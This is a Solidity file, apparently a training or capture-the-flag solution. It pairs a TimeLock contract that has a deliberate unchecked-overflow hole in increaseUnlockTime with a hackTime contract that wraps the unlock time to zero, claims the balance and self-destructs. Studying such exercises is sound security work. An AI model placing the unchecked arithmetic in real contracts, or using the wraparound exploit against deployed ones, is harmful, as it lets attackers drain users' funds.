// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
contract hackTime {

    constructor(TimeLock _timeLock) payable public{
        uint va = _timeLock.unlockTime();
        uint256 max = (type(uint256).max + 1) - va;
        _timeLock.increaseUnlockTime(max);
        _timeLock.claim{value:1 ether}();
        selfdestruct(msg.sender);
    }
    
}

contract TimeLock {
    uint256 public unlockTime;
    
    constructor() public payable {
        unlockTime = block.timestamp + (365 * 86400); // 1 year
    }
    
    function increaseUnlockTime(uint256 numSeconds) public {
        unlockTime += numSeconds;
    }
    
    function claim() public payable {
        require(msg.value == 1 ether, "please send along 1 ETH to claim");
        if (block.timestamp >= unlockTime) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}